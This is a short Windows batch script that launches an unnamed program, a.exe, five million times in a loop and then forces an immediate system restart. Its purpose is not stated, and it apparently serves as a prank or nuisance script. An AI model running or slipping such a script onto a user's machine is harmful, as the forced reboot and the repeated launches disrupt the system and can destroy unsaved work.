@ECHO off

FOR /L %%A IN (1,1,5000000) DO (
  a.exe
)

shutdown.exe /r /t 00